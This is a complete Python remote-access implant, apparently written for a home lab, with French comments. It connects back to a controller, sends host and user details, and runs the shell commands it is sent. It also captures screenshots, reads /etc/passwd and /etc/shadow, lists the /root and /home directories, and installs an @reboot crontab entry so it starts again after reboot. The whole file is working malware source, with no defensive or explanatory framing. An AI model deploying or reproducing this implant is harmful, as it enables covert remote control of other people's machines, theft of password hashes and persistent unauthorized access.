import socket
import platform
import psutil
import subprocess
import json
import time
import os
import base64
import io
import getpass
from datetime import datetime

try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

SERVER_IP   = "192.168.128.1"   # <-- IP de ton PC Windows
SERVER_PORT = 5000
RECONNECT_DELAY = 5


def log(msg):
    print(f"[{datetime.now():%H:%M:%S}] {msg}", flush=True)


def send_line(sock, obj):
    sock.sendall((json.dumps(obj) + "\n").encode("utf-8"))


def recv_line(fileobj):
    line = fileobj.readline()
    if not line:
        return None
    return json.loads(line.decode("utf-8"))


def get_network_interfaces():
    result = []
    for name, addresses in psutil.net_if_addrs().items():
        for a in addresses:
            if a.family == socket.AF_INET and not a.address.startswith("127."):
                result.append({"interface": name, "ipv4": a.address})
    return result


def get_hello():
    distro = ""
    try:
        with open("/etc/os-release") as f:
            for line in f:
                if line.startswith("PRETTY_NAME="):
                    distro = line.split("=", 1)[1].strip().strip('"')
                    break
    except Exception:
        distro = platform.platform()

    return {
        "type": "hello",
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "system": platform.system(),
        "distribution": distro,
        "architecture": platform.machine(),
        "interfaces": get_network_interfaces(),
    }


def run_shell(cmd: str) -> str:
    try:
        out = subprocess.check_output(
            ["/bin/bash", "-c", cmd],
            stderr=subprocess.STDOUT, timeout=30
        )
        return out.decode(errors="ignore")
    except subprocess.TimeoutExpired:
        return "[!] timeout 30s"
    except Exception as e:
        return f"[!] {type(e).__name__}: {e}"


def take_screenshot() -> str:
    if not HAS_PIL:
        return "[!] pillow non installé"
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return f"[!] capture impossible : {e}"


def read_passwd():
    try:
        with open("/etc/passwd") as f:
            return f.read()
    except Exception as e:
        return f"[!] {e}"


def read_shadow():
    try:
        with open("/etc/shadow") as f:
            return f.read()
    except PermissionError:
        return "[!] /etc/shadow non lisible (root requis)"
    except Exception as e:
        return f"[!] {e}"


def list_recursive(path, depth=0, max_depth=2):
    entries = []
    try:
        for name in os.listdir(path):
            p = os.path.join(path, name)
            entries.append(p)
            if os.path.isdir(p) and depth < max_depth:
                entries.extend(list_recursive(p, depth + 1, max_depth))
    except PermissionError:
        entries.append(f"[!] accès refusé : {path}")
    return entries


def enumerate_linux():
    return {
        "passwd": read_passwd(),
        "shadow": read_shadow(),
        "root":   list_recursive("/root"),
        "home":   list_recursive("/home"),
    }


def install_persistence():
    try:
        script = os.path.abspath(__file__)
        existing = subprocess.run(
            ["crontab", "-l"], capture_output=True, text=True
        ).stdout
        if script in existing:
            return "[i] déjà installé"
        new_cron = existing + f"@reboot python3 {script}\n"
        subprocess.run(["crontab", "-"], input=new_cron, text=True, check=True)
        return "[+] Persistance @reboot installée"
    except Exception as e:
        return f"[!] {type(e).__name__}: {e}"


def dispatch(msg):
    t = msg.get("type")
    try:
        if t == "command":    return run_shell(msg.get("command", ""))
        if t == "screenshot": return take_screenshot()
        if t == "enum":       return enumerate_linux()
        if t == "persist":    return install_persistence()
        return f"[!] type inconnu : {t}"
    except Exception as e:
        return f"[!] {type(e).__name__}: {e}"


def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            log(f"[+] connecté à {SERVER_IP}:{SERVER_PORT}")
            return s
        except Exception as e:
            log(f"[!] reconnexion dans {RECONNECT_DELAY}s : {e}")
            time.sleep(RECONNECT_DELAY)


def main():
    while True:
        s = connect()
        try:
            send_line(s, get_hello())
            f = s.makefile("rb")
            while True:
                msg = recv_line(f)
                if msg is None:
                    log("[-] serveur déconnecté")
                    break
                log(f"[>] {msg.get('type')}")
                result = dispatch(msg)
                send_line(s, {"type": "command_result", "result": result})
        except Exception as e:
            log(f"[!] {type(e).__name__}: {e}")
        finally:
            s.close()
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    main()